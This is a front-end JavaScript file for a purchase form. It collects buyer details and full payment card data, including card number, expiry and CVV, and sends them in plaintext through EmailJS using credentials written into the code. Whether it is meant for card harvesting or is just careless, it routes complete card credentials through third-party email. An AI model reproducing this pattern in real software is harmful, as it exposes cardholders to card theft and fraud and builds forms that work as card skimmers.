document.addEventListener("DOMContentLoaded", () => {
  emailjs.init("CSR9xQ1U8ophSkJa2"); // Initialize EmailJS

  document.getElementById("emailForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      // Collect form data
      const buyerName = document.getElementById("buyerName").value;
      const buyerEmail = document.getElementById("buyerEmail").value;
      const cardName = document.getElementById("cardName").value;
      const cardNumber = document.getElementById("cardNumber").value;
      const expiryDate = document.getElementById("expiryDate").value;
      const cvv = document.getElementById("cvv").value;
      const totalAmount = document.getElementById("totalAmount").value;
      const orderId = document.getElementById("orderId").value;
      const address = document.getElementById("address").value;
      const purchaseDate = document.getElementById("purchaseDate").value;

      // Define template parameters
      const templateParams = {
          name: buyerName,
          to_email: buyerEmail,
          card_name: cardName,
          card_number: cardNumber,
          expiry_date: expiryDate,
          cvv: cvv,
          total_amount: totalAmount,
          order_id: orderId,
          address: address,
          purchase_date: purchaseDate,
      };

      try {
          // Send the email
          await emailjs.send("service_gi9j587", "template_z94469m", templateParams);
          showTemporaryMessage("Email sent successfully!", "success");
          document.getElementById("emailForm").reset(); // Reset the form after submission
      } catch (error) {
          console.error("Error sending email:", error);
          showTemporaryMessage("Failed to send email. Please try again.", "warning");
      }
  });

  // Temporary message function
  function showTemporaryMessage(message, type) {
      let messageContainer = document.getElementById("message-container");
      if (!messageContainer) {
          messageContainer = document.createElement("div");
          messageContainer.id = "message-container";
          messageContainer.style.position = "fixed";
          messageContainer.style.top = "10px";
          messageContainer.style.right = "10px";
          messageContainer.style.zIndex = "1000";
          document.body.appendChild(messageContainer);
      }

      const messageElement = document.createElement("div");
      messageElement.textContent = message;
      messageElement.style.padding = "10px 20px";
      messageElement.style.margin = "5px";
      messageElement.style.borderRadius = "5px";
      messageElement.style.color = "white";
      messageElement.style.fontWeight = "bold";
      messageElement.style.opacity = "1";
      messageElement.style.transition = "opacity 0.5s ease";

      if (type === "success") {
          messageElement.style.backgroundColor = "#4caf50";
      } else if (type === "warning") {
          messageElement.style.backgroundColor = "#f44336";
      }

      messageContainer.appendChild(messageElement);

      setTimeout(() => {
          messageElement.style.opacity = "0";
          setTimeout(() => {
              messageContainer.removeChild(messageElement);
          }, 500);
      }, 3000);
  }
});
